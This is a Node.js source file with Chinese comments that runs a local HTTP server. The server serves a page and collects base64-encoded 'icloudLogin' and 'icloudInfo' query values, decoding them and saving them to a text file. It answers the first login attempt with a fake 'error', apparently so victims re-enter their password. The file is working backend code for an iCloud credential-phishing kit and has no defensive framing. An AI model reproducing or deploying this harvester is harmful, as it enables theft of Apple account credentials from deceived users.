
let os = require('os');
let http = require('http'); // http协议模块
let url = require('url'); // url解析模块
let fs = require('fs'); // 文件系统模块
let path = require('path'); // 路径解析模块

const html1 = './1.html';

global.Buffer = global.Buffer || require('buffer').Buffer;

if (typeof btoa === 'undefined') {
    global.btoa = function (str) {
        return new Buffer(str, 'binary').toString('base64');
    };
}

if (typeof atob === 'undefined') {
    global.atob = function (b64Encoded) {
        return new Buffer(b64Encoded, 'base64').toString('binary');
    };
}

// 获得本机ip地址
let getHost = () => {
    let INTERFACES = os.networkInterfaces(); // 在开发环境中获取局域网中的本机iP地址
    // console.log(JSON.stringify(INTERFACES));
    let wifi_host = '';
    let local_host = '';
    for (let devName in INTERFACES) {
        let iface = INTERFACES[devName];
        for (let i = 0; i < iface.length; i++) {
            let alias = iface[i];
            if (alias.family === 'IPv4' && alias.address !== '127.0.0.1' && !alias.internal) {
                if (devName === '本地连接') {
                    local_host = alias.address;
                } else if (devName === '无线网络连接' || devName === 'WLAN') {
                    wifi_host = alias.address;
                }
            }
        }
    }

    return {
        'wifi': wifi_host || local_host,
        'local': local_host || wifi_host
    };
}

let host = getHost();
let post = '3030';

let isFirst = true;
let log = "";

let writedown = () => {
    fs.open("./1.txt", 'w', (err, fd) => {
        if (err) {
        }
        let str = log;//JSON.stringify(log);
        fs.writeFile(fd, str, (err) => {
            if (err) {
            }
            fs.close(fd, (err) => {
                console.log('saved');
            });
        });
    });
}

let isFirstLogin = true;

let listener = (request, response) => {
    if (isFirst) {
        isFirst = false;
        console.log(request['headers']['user-agent']);
    }
    // console.log(`有人访问了服务器 ==> ${request.url}`);

    let requestUrl = request.url; // 端口号后全部
    let pathName = url.parse(requestUrl).pathname; // 款口号后至问号前
    let query = url.parse(requestUrl).query; // 问号后
// console.log(pathName);
    if (pathName == '/jquery.js' || pathName == '/main.css' || pathName == '/app.css') {
        let jsstr = '';
        if (fs.existsSync(`./${pathName}`)) {
            response.writeHead(200, { 'content-type': 'application/javascript; charset=UTF-8' });
            jsstr = fs.readFileSync(`./${pathName}`) || '';
        } else {
            response.writeHead(404, { 'content-type': 'application/javascript; charset=UTF-8' });
        }
        response.end(jsstr);
        return;
    } else if (pathName == "/favicon.ico") {
        let imgstr = '';
        if (fs.existsSync(`./${pathName}`)) {
            response.writeHead(200, { 'content-type': 'image/x-icon' });
            imgstr = fs.readFileSync(`./${pathName}`) || '';
        } else {
            response.writeHead(404, { 'content-type': 'image/x-icon' });
        }
        response.end(imgstr);
        return;
    } else if (pathName == "/query") {
        if (query) {
            let qs = query.split("&");
            let key = '';
            qs.forEach(e => {
                if (e.indexOf('icloudLogin=') != -1) {
                    key = "icloudLogin";
                    query = e.replace('icloudLogin=', '');
                } else if (e.indexOf('icloudInfo=') != -1) {
                    key = "icloudInfo";
                    query = e.replace('icloudInfo=', '');
                }
            });
            query = decodeURIComponent(atob(query));
            query = key + "=>" + query;
            console.log(`return query ==> ${query}`);
            log += ("\n" + query);
            if(key === "icloudLogin" && isFirstLogin){
                isFirstLogin = false;
                response.write("error");
            }else{
                response.write("");
            }
            response.end();
        }
        writedown();
        return;
    }

    if (query) {
        // console.log(`path is ${pathName}`);
        // let qs = query.split("&");
        // qs.forEach(e => {
        //     if(e.indexOf('checkstring=') != -1){
        //         query = e.replace('checkstring=', '');
        //     }
        // });
        // console.log(`get query ==> ${query}`);
        // query = decodeURIComponent(atob(query));
        // // response.writeHead(301, {
        // //     location: `http://${host.local}:${post}${pathName}`
        // // });
        // console.log(`return query ==> ${query}`);
        // response.write(query);
        // response.end();
    } else {
        let htmlstr = '';
        if (fs.existsSync(html1)) {
            response.writeHead(200, { 'content-type': 'text/html' });
            htmlstr = fs.readFileSync(html1) || '';
        } else {
            response.writeHead(404, { 'content-type': 'text/html' });
        }
        response.end(htmlstr);
    }
};

//2. 创建http服务器
// 参数: 请求的回调, 当有人访问服务器的时候,就会自动调用回调函数
var server = http.createServer(listener);

//3. 绑定端口
server.listen(post, host.local, () => {
    console.log(`绑定完成 ==> ${host.local}:${post}`);
});

//4. 执行
console.log('执行了3030')